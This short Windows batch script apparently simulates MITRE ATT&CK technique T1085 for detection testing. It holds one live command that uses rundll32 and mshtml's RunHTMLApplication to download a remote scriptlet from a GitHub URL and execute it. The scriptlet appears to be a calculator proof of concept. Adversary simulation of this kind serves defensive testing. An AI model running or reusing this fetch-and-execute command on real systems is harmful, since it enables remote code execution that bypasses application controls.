@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Suspicious Executions via Rundll32 (T1085)
ECHO.
ECHO [+] Simulates execution of arbitrary binaries and scripts using 'RUNDLL32'
ECHO ---------------------------------------------------------------------------
cmd /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/greycel/poc/master/calc.sct").Exec();
ECHO.
